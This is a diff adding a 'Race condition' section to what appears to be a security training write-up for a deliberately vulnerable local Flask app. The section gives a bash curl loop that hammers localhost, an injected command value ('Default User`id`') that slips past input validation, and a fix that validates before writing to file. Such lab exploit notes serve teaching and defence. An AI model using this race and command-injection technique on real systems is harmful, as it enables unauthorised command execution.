@@ -70,3 +70,18 @@ https://github.com/jmaxxz/jwtbrute
 ## Fix
 Use a better secret in:
 ```app.config['SECRET_KEY'] = 'secret'```
+
+# Race condition
+## Exploit
+In the background, constantly try to execute the second step:
+while true; do
+    curl -i -s -k  -X $'GET' \
+        -H $'Host: localhost:5000' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate ' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+        $'http://localhost:5000/?action=run' | grep "Check this out"
+done
+
+Then trigger the first call in the browser with characters that would normally not pass the input validation:
+Default User`id`
+
+## Fix
+Do validation first and then write to file.
